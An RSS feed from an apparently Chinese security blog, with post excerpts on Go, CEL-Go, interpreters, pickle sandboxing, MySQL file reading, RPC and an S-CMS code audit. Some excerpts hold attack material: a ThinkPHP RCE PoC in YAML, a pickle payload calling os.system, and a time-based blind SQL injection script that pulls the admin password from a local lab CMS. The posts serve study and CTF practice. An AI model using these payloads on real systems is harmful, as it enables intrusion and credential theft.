<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Theoyu&#39;s Blog</title>
    <link>https://theoyu.top/</link>
    <description>Recent content on Theoyu&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
    <lastBuildDate>Thu, 02 Dec 2021 23:30:20 +0800</lastBuildDate><atom:link href="https://theoyu.top/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>go并发的几个问题</title>
      <link>https://theoyu.top/posts/concurrent-in-go/</link>
      <pubDate>Thu, 02 Dec 2021 23:30:20 +0800</pubDate>
      
      <guid>https://theoyu.top/posts/concurrent-in-go/</guid>
      <description>前言 作为世界上除了PHP之外最好的语言golang，只需go关键字修饰函数，就可以直接启动一个goroutine(协程)运行，但在实际的场景中，我们需要考虑到协程的数量，其之间的同步与通信，以及精确控制其结束。
如何控制协程的通信 引入全局变量 这是最简单也是最容易想到的方法：虽然goroutine的退出只能由其自身的决定，不允许从外部直接控制，不过我们可以通过引入全局变量，所有的goroutine都共享这个变量，并且不断寻查其是否更新，在主程序中对其更改，goroutine勘测到其变化后做出反应。
package main import ( &amp;#34;fmt&amp;#34; &amp;#34;time&amp;#34; ) var running bool func run() { for running { fmt.Println(&amp;#34;running&amp;#34;) time.Sleep(500*time.Millisecond) } fmt.Println(&amp;#34;stop now&amp;#34;) } func main(){ running=true go run() go run() time.Sleep(time.Second) running=false time.Sleep(time.Second) } /* out: running running running running stop now stop now */ 这种写法看似很简单，但是还是有好几个问题：
 全局变量存在数据同步问题，如果有多个写入需要加锁处理。 协程之间的通信量很小，只有事先定义的全局变量，并且只能单向从主程序通知给协程。  利用channel通信 相信写go的兄弟，一定对这一句话不陌生：
 Go语言的并发模型是CSP（Communicating Sequential Processes）通信顺序进程，提倡通过通信共享内存而不是通过共享内存而实现通信。
 这里简单谈谈我的理解:
共享内存是什么?如果在一个系统中，不同进程或者线程共享一块内存，那么他们之间不需要进行平凡的交互，如果有大量的数据传输，也省去了数据拷贝的消耗。
但是这有一个很大的问题，就是多线程下，共享一块内存，肯定会存在数据冲突。为了对抗这种冲突，人们发明了很多机制，比如加锁，信号量，各种调度算法等等，但是这毫无都会对并发的性能造成影响。(但并不是说全部都不行，比如深度 | 字节跳动微服务架构体系演进）
最终“通过通信来实现进程/线程间交互”的方案脱颖而出,go就在语言层提供了channel来实现这一方案，简单理解就是设计的时候，对于消息队列，只提供读写接口，而对于内部的实现你完全不用去在意，看起来消息队列就像是共享内存一样了。然而你的消息队列可以利用socket进行通信。
通过看channel的源码，可以看出它其实就是一个队列加一个轻量锁
type hchan struct { qcount uint // total data in the queue  dataqsiz uint // size of the circular queue  buf unsafe.</description>
    </item>
    
    <item>
      <title>Preliminary Study on CEL-Go</title>
      <link>https://theoyu.top/posts/cel-go/</link>
      <pubDate>Tue, 26 Oct 2021 23:24:32 +0800</pubDate>
      
      <guid>https://theoyu.top/posts/cel-go/</guid>
      <description>前言 XRAY很牛逼，但是其并不开源，最近也是想写点东西，就自己也造个轮子，有时间的话就把Thinkphp，structs2，weblogic都整上了。
poc的话当然希望可以直接融合XRAY的poc，采用YAML格式，但有一个问题，比如我们一般用gopkg.in/yaml.v2把YAML解析为结构体，但如果YAML中出现一些表达式，就很难直接用结构体解决。(无脑正则当然ok)
name:poc-yaml-thinkphp5023-method-rcerules:- method:POSTpath:/index.php?s=captchaheaders:Content-Type:application/x-www-form-urlencodedbody:|_method=__construct&amp;amp;filter[]=printf&amp;amp;method=GET&amp;amp;server[REQUEST_METHOD]=TmlnaHQgZ2F0aGVycywgYW5%25%25kIG5vdyBteSB3YXRjaCBiZWdpbnMu&amp;amp;get[]=1expression:|response.status==200&amp;amp;&amp;amp;response.body.bcontains(b&amp;#34;TmlnaHQgZ2F0aGVycywgYW5%kIG5vdyBteSB3YXRjaCBiZWdpbnMu1&amp;#34;)detail:links:- https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce上面的expression其实很好理解，长得比较像python表达式，在python中eval可以直接对表达式求解，而我们现在也就需要一个高效的方法可以自定义求解表达式。
在XRAY-如何编写expression表达式中其实有提到一个库 ==&amp;gt; CEL-Go,官网介绍看了半天说实话不知道在干嘛&amp;hellip;查了查国内这方面的教程也几乎为0，不过好在Google大爹的codelabs实在良心，自己也跟着过一遍，算是入了个门，在这简单记录一下。
Introduction  CEL是为了安全的执行用户代码而设计的一门“语言”，就像用户在Python上盲目调用eval是危险的，但CEL可以安全的执行。
CEL多用于求解表达式，类似single line functions或者lambda表达式，并且通常用于计算bool值，但它也可用于构造更复杂的对象，如JSON或Protobuf。
 Key concepts  Variable bindings Function bindings for any custom extensions An AST to evaluate  Declare the variables cel中数据类型是绑定在protobuf上的，所以我们先简单写一个proto文件
syntax = &amp;#34;proto3&amp;#34;;package celDemo;option go_package = &amp;#34;celDemo/bp&amp;#34;;message Response{ string url = 1; int32 status =2; bytes body = 3;}生成对应go文件 == &amp;gt;protoc --go_out=. celDemo/http.proto
celDemo ├── bp │ └── http.pb.go ├── cel.go ├── cel_test.go └── http.</description>
    </item>
    
    <item>
      <title>白帽子讲web安全</title>
      <link>https://theoyu.top/posts/course/whitehat-and-security/</link>
      <pubDate>Mon, 25 Oct 2021 10:26:13 +0800</pubDate>
      
      <guid>https://theoyu.top/posts/course/whitehat-and-security/</guid>
      <description>前言 安全工程师的核心竞争力不在于拥有多少个0day，掌握多少种安全技术，而是在于他对安全理解的深度，以及由此引申的看待安全问题的角度和高度。
站在白帽子的视角，除了剖析攻击原理，更加需要关注如何防范这些漏洞。
第一章 我的安全世界观 数据从高等级的信任域流向低等级的信任域，是不需要经过安全检查的，反之则需要。
安全问题的本质是信任的问题。
安全三要素(CIA)：
 机密性(Confidentiality)：数据内容不能泄漏 完整性(Integrity)：数据内容完成，没有被篡改 ==&amp;gt; 数字签名 可用性(Availability)：拒绝服务攻击的是可用性  安全评估：
1. 资产等级划分 划分信任域和信任边界 互联网安全的核心问题，是数据安全的问题。 2. 威胁分析 威胁建模 书中提到的了TRIDE，不过现在ATT&amp;amp;CK应该更加全面。 3. 风险分析 Risk = Probability * Damage Potential 4. 确定解决方案 有效解决问题 用户体验好 高性能 低耦合 易于拓展和升级 白帽子兵法：
1. Secure By Default 原则： 使用白名单优于黑名单 最小权限原则 2. 纵深防御原则：在各个不同层次实施安全方案。 3. 数据与代码分离原则 4. 不可预测原则： 有效对抗基于篡改，伪造的攻击。 token防御CSRF。 第二章 浏览器安全 同源策略(Same origin Policy)：
限制来自不同源的“document”或脚本，对当前“document”读取或设置某些属性。 影响“源”的因素：host、子域名、端口、协议。 页面存放文件的域并不重要，重要的是加载文件所在的域。 &amp;lt;script&amp;gt;、&amp;lt;img&amp;gt;、&amp;lt;iframe&amp;gt;等标签可以跨域加载资源 XMLHttpRequest受同源策略的约束，需要通过目标域返回的HTTP头来授权是否允许跨域访问。
对浏览器而言，除了DOM、Cookie、XMLHttpRequest受到同源策略的限制，浏览器第三方插件也有自己的同源策略（Flash、Java Applet、Google Gears）
浏览器沙箱：
Sandbox的设计的目的是为了让不可信任的代码运行在一定环境中，限制不可信任的代码访问隔离区之外的资源。如果需要跨越Sandbox边界交换数据，只能通过封装的API完成。</description>
    </item>
    
    <item>
      <title>popMaster</title>
      <link>https://theoyu.top/posts/popmaster/</link>
      <pubDate>Sat, 09 Oct 2021 23:30:20 +0800</pubDate>
      
      <guid>https://theoyu.top/posts/popmaster/</guid>
      <description>强网杯popmaster这题一直耿耿于怀，用正则毕竟不是作者的本意。刚好在看静态分析这块，纯理论实在太难顶，就再重新揣摩揣摩。
php-parser是一项用PHP编写的PHP解释器，可以把php代码转化为AST，以利于我们静态分析，在回到这道题之前，先简单了解一下php-parser的用法。
一个简单的例子：
&amp;lt;?php use PhpParser\Error; use PhpParser\NodeTraverser; use PhpParser\ParserFactory; require &amp;#39;vendor/autoload.php&amp;#39;; $code = &amp;lt;&amp;lt;&amp;lt;&amp;#39;CODE&amp;#39; &amp;lt;?php $a=&amp;#34;theoyu&amp;#34;; echo($a); CODE; //创建解释器实例 $parser = (new ParserFactory)-&amp;gt;create(ParserFactory::PREFER_PHP7); try { $ast = $parser-&amp;gt;parse($code); var_dump($ast); } catch (Error $error) { echo &amp;#34;Parse error: {$error-&amp;gt;getMessage()}\n&amp;#34;; return; } 首先需要创建一个解释器实例，同时需要指明php版本，对源码进行解析，同时通过PhpParser\Error对代码的异常进行捕获。
array(2) {[0]=&amp;gt;object(PhpParser\Node\Stmt\Expression)#1178 (2) {[&amp;#34;expr&amp;#34;]=&amp;gt;object(PhpParser\Node\Expr\Assign)#1177 (3) {[&amp;#34;var&amp;#34;]=&amp;gt;object(PhpParser\Node\Expr\Variable)#1175 (2) {[&amp;#34;name&amp;#34;]=&amp;gt;string(1) &amp;#34;a&amp;#34;[&amp;#34;attributes&amp;#34;:protected]=&amp;gt;array(2) {[&amp;#34;startLine&amp;#34;]=&amp;gt;int(2)[&amp;#34;endLine&amp;#34;]=&amp;gt;int(2)}}[&amp;#34;expr&amp;#34;]=&amp;gt;object(PhpParser\Node\Scalar\String_)#1176 (2) {[&amp;#34;value&amp;#34;]=&amp;gt;string(6) &amp;#34;theoyu&amp;#34;[&amp;#34;attributes&amp;#34;:protected]=&amp;gt;array(3) {[&amp;#34;startLine&amp;#34;]=&amp;gt;int(2)[&amp;#34;endLine&amp;#34;]=&amp;gt;int(2)[&amp;#34;kind&amp;#34;]=&amp;gt;int(2)}}[&amp;#34;attributes&amp;#34;:protected]=&amp;gt;array(2) {[&amp;#34;startLine&amp;#34;]=&amp;gt;int(2)[&amp;#34;endLine&amp;#34;]=&amp;gt;int(2)}}[&amp;#34;attributes&amp;#34;:protected]=&amp;gt;array(2) {[&amp;#34;startLine&amp;#34;]=&amp;gt;int(2)[&amp;#34;endLine&amp;#34;]=&amp;gt;int(2)}}[1]=&amp;gt;object(PhpParser\Node\Stmt\Echo_)#1180 (2) {[&amp;#34;exprs&amp;#34;]=&amp;gt;array(1) {[0]=&amp;gt;object(PhpParser\Node\Expr\Variable)#1179 (2) {[&amp;#34;name&amp;#34;]=&amp;gt;string(1) &amp;#34;a&amp;#34;[&amp;#34;attributes&amp;#34;:protected]=&amp;gt;array(2) {[&amp;#34;startLine&amp;#34;]=&amp;gt;int(3)[&amp;#34;endLine&amp;#34;]=&amp;gt;int(3)}}}[&amp;#34;attributes&amp;#34;:protected]=&amp;gt;array(2) {[&amp;#34;startLine&amp;#34;]=&amp;gt;int(3)[&amp;#34;endLine&amp;#34;]=&amp;gt;int(3)}}}可以使用NodeDumper更加直观的查看AST
use PhpParser\NodeDumper; $dumper = new NodeDumper; echo $dumper-&amp;gt;dump($ast) ; array(0:Stmt_Expression(expr:Expr_Assign(var:Expr_Variable(name:a)expr:Scalar_String(value:theoyu)))1:Stmt_Echo(exprs:array(0:Expr_Variable(name:a))))回到源码</description>
    </item>
    
    <item>
      <title>漫谈解释器</title>
      <link>https://theoyu.top/posts/talk-about-interpreter/</link>
      <pubDate>Sun, 19 Sep 2021 22:24:32 +0800</pubDate>
      
      <guid>https://theoyu.top/posts/talk-about-interpreter/</guid>
      <description>前言 开个新坑，本来是打算学学编译器的，但是发现基础太薄弱了，就先学习解释器相关吧，刚好大创也需要这一块的知识。
主要参考以下两本教材
 编译器设计 Writing An Interpreter In Go  概述 编译型语言 有的编程语言要求必须提前将所有源代码一次性转换成二进制指令，也就是生成一个可执行程序，比如C、c++、Golang等，这种编程语言称为编译型语言，使用的转换工具称为编译器。
解释型语言 有的编程语言可以一边执行一边转换，不会生成可执行程序，比如 JavaScript、PHP等。这种编程语言称为解释型语言，使用的转换工具称为解释器。
编译+解释 严格意义上python不算是单纯的解释型语言，其还会编译为pyc字节码，由pvm解释执行这个字节码文件，每一次负责将一条字节码文件语句翻译成cpu可以直接执行的机器代码。
java从源代码编译为字节码，然后在JVM上运行字节码执行，JVM是一种字节码的解释器，JVM的实现包括一个运行时的编译器，称为JIT(just-in-time)编译器，其最大的优势在于可以在运行时进行及时优化。更多关于JIT的知识可参考这篇文章.
在知乎看到一个很有意思的提问：
 我之前看知乎上有人分析，编译型语言能够直接生成二进制代码（Windows下就是EXE或DLL吧），而解释型语言不会生成二进制代码，最多道二进制代码的前一步。
我对这种解释有些无法理解，感觉这似乎不是他们的本质吧。Python是一个解释性语言，但我记得Python可以下载一个包，能够将Python直接编译为EXE可执行程序，难道说，我下载了这个包之后，Python就从解释型语言变为编译型语言了不成？
是这个概念区分本身就有严重的先天缺陷，还是我的理解本身有错误？
 其中无论对与否，比较戳中我的回答：
 语言只是规定语法，最后用这语言写出来的代码怎么翻译成机器码，怎么运行，还需要一个实现。这个实现可以是编译器也可以是解释器。
所以你也可以做一个python的编译器或者C语言的解释器
 编译器构成 现在国内外大多教材(虽然我都没看过)在编译器这一块是头重脚轻的，比重前端&amp;raquo;后端&amp;gt;优化器，虽然对于编译器这样非常不合理，不过站在学习静态分析的方向，更多的关注点还是放在前端，当然优化部分也不可忽视，比如这个值得反复揣摩的问答。
前端 前端部分，其实现有很多工具已经帮我们实现了
词法分析器 源代码在计算机『眼中』其实是一团乱麻。无法被理解的字符串在计算器看来并没有什么区别，为了理解这些字符我们需要做的第一件事情就是将字符串分组，这能够降低理解字符串的成本，简化源代码的分析过程。所有的编译过程其实都是从解析代码的源文件开始的，词法分析的作用就是解析源代码文件，它将文件中的字符串序列转换成 Token 序列，方便后面的处理和解析，我们一般会把执行词法分析的程序称为词法解析器（lexer）。
对于词法分析器而言，最繁杂的一步，也就是需要我们把这门语言可能用到的token全部枚举出来
package token const( // Identifiers + literals 	IDENT = &amp;#34;IDENT&amp;#34; // add, foobar, x, y, ... 	INT = &amp;#34;INT&amp;#34; // 1343456  // Operators 	ASSIGN = &amp;#34;=&amp;#34; PLUS = &amp;#34;+&amp;#34; // Delimiters 	COMMA = &amp;#34;,&amp;#34; SEMICOLON = &amp;#34;;&amp;#34; LPAREN = &amp;#34;(&amp;#34; // Keywords 	FUNCTION = &amp;#34;FUNCTION&amp;#34; LET = &amp;#34;LET&amp;#34; TRUE = &amp;#34;TRUE&amp;#34; .</description>
    </item>
    
    <item>
      <title>something0x02</title>
      <link>https://theoyu.top/posts/essay/%E9%9A%8F%E7%AC%940x02/</link>
      <pubDate>Tue, 17 Aug 2021 23:55:32 +0800</pubDate>
      
      <guid>https://theoyu.top/posts/essay/%E9%9A%8F%E7%AC%940x02/</guid>
      <description>还是想还是写点什么，但不知道该怎么下笔。
对朋友而言，我算是一个倾诉欲望很强的人，不管是开心的事情也好，伤心的也罢。但如果真的记录下来，好像就都会变成比较丧，尽管我认为自己是一个比较乐观的人，我也希望可以给身边的人带来快乐，所以就会变得有些许矛盾。
实习这几天，晚上睡觉经常一直胡思乱想，为什么我会坚持做一些事情。
为什么我要写博客，可能刚开始看到了很多师傅，学长都有博客，心想如果我学着写会不会变成像他们这样厉害的人呢？到后来应该是大家都开始记录，有时候看到别人的访问或者评论还会暗暗的开心。
为什么我要打比赛呢，感觉~~&amp;mdash;&amp;ndash;~~
为什么我要学习安全。换在一年前，或者半年前，我一定会毫不犹豫的说，我喜欢。但在我打下这几个字的时候，我感到很焦虑。直到现在我都没有怀疑过我的初心，但我无法保证是是否还能坚守初衷。就好像写文章，变成了我更希望别人看到怎样的我，而不是我现在到底怎样。复现题目，也从之前的不求甚解，变成了 :哦就这样啊，那下次注意。如果说做的这么多都变成了刻意，那我应该得好好反思关于未来的事情。
也有可能是闲的慌了，容易胡思乱想，我更加能接受这个理由。至少在学校，和朋友们在一起，好像时间会慢很多，大家也不会去规划太多关于未来的事情。在家里有我那粘人的弟弟天天烦着我，每天乐呵乐呵也就过去了。哦对了提一嘴，弟弟的小升初成绩十分不错，让他狠狠的骄傲了一会，行吧，这六年来被我和爸妈三个人教训也挺幸苦的，发工资了就奖赏他一会，不过好像他更希望我能回家。
工作还是挺累的，自认为晚上回来还能学一些其他的知识，事实上是我想多了。偶然的机会，又重新读了读《山河之书》，不得不说，高中读这本书，和现在完全是不同的感觉。高中仅仅是欣赏他的文笔，但不喜欢他的思想，也可能是对应试教育的厌烦，总觉得能从景点中品出那么多感情的人很矫情，但现在又不一样。偶尔的共鸣也是可以接受的，许多风景，也会不自禁的带入不同的人随行，感觉很奇妙。
前几天看到通知说江苏最早15号返校，本来也和我没什么关系，实习的话最早好像也得20号走吧，但谈到学校还是会有一些触动，可能是学校里有让自己挂念的人，也可能是还没有提前适应社会的洗礼。不过现在实习的工作也挺nice，组长和学长都挺照顾的。
是随笔的话，也就这样零零散散的写吧，应该哪天觉得幼稚就删了。</description>
    </item>
    
    <item>
      <title>pickle</title>
      <link>https://theoyu.top/posts/pickle/</link>
      <pubDate>Sat, 14 Aug 2021 23:30:20 +0800</pubDate>
      
      <guid>https://theoyu.top/posts/pickle/</guid>
      <description>相关介绍看手册就行，写的不能再详细。
那么如果一个允许Unpickle的场景，环境一般会做怎么样的限制呢？
毫无疑问又演变成沙盒了，在如今ctf越来越卷的情况下，限制条件也是越来越苛刻。从官方给的一个demo看看：
import builtins import io import pickle safe_builtins = { &amp;#39;range&amp;#39;, &amp;#39;complex&amp;#39;, &amp;#39;set&amp;#39;, &amp;#39;frozenset&amp;#39;, &amp;#39;slice&amp;#39;, } class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): # Only allow safe classes from builtins. if module == &amp;#34;builtins&amp;#34; and name in safe_builtins: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(&amp;#34;global &amp;#39;%s.%s&amp;#39; is forbidden&amp;#34; % (module, name)) def restricted_loads(s): &amp;#34;&amp;#34;&amp;#34;Helper function analogous to pickle.loads().&amp;#34;&amp;#34;&amp;#34; return RestrictedUnpickler(io.BytesIO(s)).load() test= b&amp;#34;cos\nsystem\n(S&amp;#39;echo hello world&amp;#39;\ntR.&amp;#34; restricted_loads(test) 其中这里重写了find_class</description>
    </item>
    
    <item>
      <title>When Mysql read your file</title>
      <link>https://theoyu.top/posts/mysql-read-file/</link>
      <pubDate>Sun, 08 Aug 2021 01:20:20 +0800</pubDate>
      
      <guid>https://theoyu.top/posts/mysql-read-file/</guid>
      <description>这并不是一个新鲜的漏洞，准确的来说是炒冷饭，不过刚好学了计网，就来分析一下吧，顺便用go来重写一个简易蜜罐。
我们先看一看mysql客户端连接的这个过程，进行了怎样的通讯。
我们无需在意tcp的连接过程，所以直接过滤mysql协议即可。总的来说这里经历了5个过程。
 S➡C Server Greeting C➡S Login Request S➡C Response OK C➡SRequst Query S➡CRespose  当客户端连接上服务器，服务器就会发送Server Greeting这第一个握手数据包，这些数据的内容取决于服务器版本和服务器配置
0000 4a 00 00 00 0a 35 2e 35 2e 35 33 00 05 00 00 00 J....5.5.53.....0010 31 47 50 3d 22 31 6e 58 00 ff f7 21 02 00 0f 80 1GP=&amp;quot;1nX...!....0020 15 00 00 00 00 00 00 00 00 00 00 4d 5b 5e 48 2e .</description>
    </item>
    
    <item>
      <title>Study rpc</title>
      <link>https://theoyu.top/posts/course/rpc/</link>
      <pubDate>Wed, 28 Jul 2021 10:26:13 +0800</pubDate>
      
      <guid>https://theoyu.top/posts/course/rpc/</guid>
      <description>RPC  远程过程调用（英语：Remote Procedure Call，缩写为 RPC）是一个计算机通信协议。该协议允许运行于一台计算机的程序调用另一个地址空间（通常为一个开放网络的一台计算机）的子程序，而程序员就像调用本地程序一样，无需额外地为这个交互作用编程（无需关注细节）。RPC是一种服务器-客户端（Client/Server）模式，经典实现是一个通过发送请求-接受回应进行信息交互的系统。 – 远程过程调用 - Wikipedia.org
 简单来说，RPC就是一个CS模型。传统CS直接进行连接，像类似中断重连，重复请求，双向的信息交互都需要一个一个写操作。而一个好的RPC框架为我们提供了接口，只需要面向过程编程即可。
RPC流程：
从上图可以看出,rpc本身也是一种 request-response 协议。
有些实现扩展了远程调用的模型，实现了双向的服务调用，但是不管怎样，调用过程还是由一个客户端发起，服务器端提供响应，基本模型没有变化。
服务的调用过程为：
 client调用client stub，这是一次本地过程调用 client stub将参数打包成一个消息，然后发送这个消息。打包过程也叫做 marshalling(编码) client所在的系统将消息发送给server server的的系统将收到的包传给server stub server stub解包得到参数。 解包也被称作 unmarshalling(解码) 最后server stub调用服务过程. 返回结果按照相反的步骤传给client  golang自带的rpc框架也不错，不过更多的尝试还是放在了Google的开源跨语言rpc框架gRPC。
gRPC 在认识gRPC前需要先了解protobuf。
 gRPC uses Protocol Buffers, Google’s mature open source mechanism for serializing structured data (although it can be used with other data formats such as JSON). Here’s a quick intro to how it works.</description>
    </item>
    
    <item>
      <title>闪灵cms前台注入&#43;后台getshell</title>
      <link>https://theoyu.top/posts/codeaudit/s_cms/</link>
      <pubDate>Fri, 16 Jul 2021 17:19:18 +0800</pubDate>
      
      <guid>https://theoyu.top/posts/codeaudit/s_cms/</guid>
      <description>题目给了sql文件，其中管理员密码进行了更改。
前台注入 web界面非常美观，admin路由下是登陆界面，同时有滑动条的检测，爆破的思路肯定走不通。看一下源码对登陆处的数据处理。
在function/function.php下可以看到：
在check_input下都调用了addslashes,同时还有许多的过滤那常规注入是走不通了，这里巧的地方在于转义只对value进行了转义。
看看function/form.php，关键点在第162行。
mysqli_query($conn,&amp;#34;Insert into &amp;#34;.TABLE.&amp;#34;response(R_cid,R_content,R_time,R_rid,R_member,R_ip) values(&amp;#34;.$x.&amp;#34;,&amp;#39;&amp;#34;.htmlspecialchars($y).&amp;#34;&amp;#39;,&amp;#39;&amp;#34;.$R_time.&amp;#34;&amp;#39;,&amp;#39;&amp;#34;.$R_rid.&amp;#34;&amp;#39;,&amp;#34;.$M_id.&amp;#34;,&amp;#39;&amp;#34;.getip().&amp;#34;&amp;#39;)&amp;#34;); 这在一个嵌套了很多层的if语句内，根据走向前提交一个test
http://127.0.0.1/cms/s_cms/web/function/form.php?action=inputPOST:1-sleep(5)=xxx成功延迟了5s,也就是之前对key没有进行检查造成的伏笔。
import requests,time x = [str(x) for x in range(0, 10)] y = [chr(y) for y in range(97, 123)] dic = x+y url = &amp;#39;http://127.0.0.1/cms/s_cms/web/function/form.php?action=input&amp;#39; result=&amp;#39;&amp;#39; for i in range(1,33): for j in dic: data={ &amp;#34;1-if((select(substr(A_pwd,{},1))from/**/SL_admin)=&amp;#39;{}&amp;#39;,sleep(3),1)&amp;#34;.format(i,j):&amp;#34;xxx&amp;#34; } startTime = time.time() res = requests.post(url=url,data=data) endTime = time.time() if endTime - startTime &amp;gt; 3: result=result+j print(&amp;#39;[+] &amp;#39;+result) break 后台getshell 后台的功能挺多的，但是翻了很久都没能找到可以利用的点，无意见翻到这个检测更新：</description>
    </item>
    
  </channel>
</rss>
